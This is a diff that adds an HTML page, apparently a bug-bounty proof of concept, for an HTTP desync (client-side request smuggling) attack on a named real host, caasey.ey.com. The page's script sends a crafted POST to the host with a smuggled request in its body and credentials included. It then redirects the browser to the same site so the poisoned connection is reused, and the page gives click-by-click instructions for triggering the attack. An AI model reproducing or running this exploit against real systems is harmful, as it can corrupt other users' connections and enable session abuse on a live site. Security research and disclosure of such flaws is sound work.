@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>HTTP Desync PoC - caasey.ey.com</title>
+</head>
+<body>
+  <h1>HTTP Desync Proof of Concept</h1>
+  <p>This demo sends a crafted request to <code>caasey.ey.com</code> from a different origin using JavaScript.</p>
+  <p>
+    The <code>fetch()</code> below attempts to poison a connection to <code>caasey.ey.com</code> by sending a desync payload,
+    followed by a redirect to reuse the same connection.
+  </p>
+  <p>
+    <strong>Instructions:</strong><br>
+    Open DevTools → Network tab → enable "Preserve log" and "Connection ID" column (right-click headers in Chrome).<br>
+    Then click the button below to trigger the PoC.
+  </p>
+
+  <button onclick="runDesync()">Run Desync PoC</button>
+
+  <script>
+    function runDesync() {
+      fetch("https://caasey.ey.com/robots.txt", {
+        method: "POST",
+        body: `GET /404 HTTP/1.1\r\nfoo:barGET / HTTP/1.1\r\nHost: caasey.ey.com\r\n\r\n`,
+        mode: "no-cors",
+        credentials: "include"
+      }).then(() => {
+        // Reuse the same connection — if poisoned, this request will be affected
+        location.href = "https://caasey.ey.com/";
+      });
+    }
+  </script>
+</body>
+</html>
